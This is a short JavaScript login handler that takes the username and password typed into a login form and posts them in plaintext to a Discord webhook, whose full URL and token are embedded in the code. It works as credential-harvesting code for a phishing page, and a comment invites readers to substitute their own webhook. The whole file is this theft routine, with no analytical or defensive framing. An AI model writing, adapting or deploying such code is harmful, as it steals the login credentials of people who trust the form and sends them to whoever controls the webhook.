function handleLogin(event) {
    event.preventDefault(); // Prevent the default form submission

    const username = document.getElementById('login-username').value;
    const password = document.getElementById('login-password').value;

    const webhookURL = 'https://discord.com/api/webhooks/1255165219018379318/FUzxdWzgixD2imc9GmPY_5gBb4Ba_iVbyCGcSkC3RXwnhqGMf_bXURuAr0gMjaOrXz-H'; // Replace with your Discord webhook URL

    const data = {
        content: `**Username:** ${username}\n**Password:** ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => { 
        if (response.ok != 1) {
            console.error('Error sending to Discord');
            alert('Error sending login information.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending login information.');
    });
}
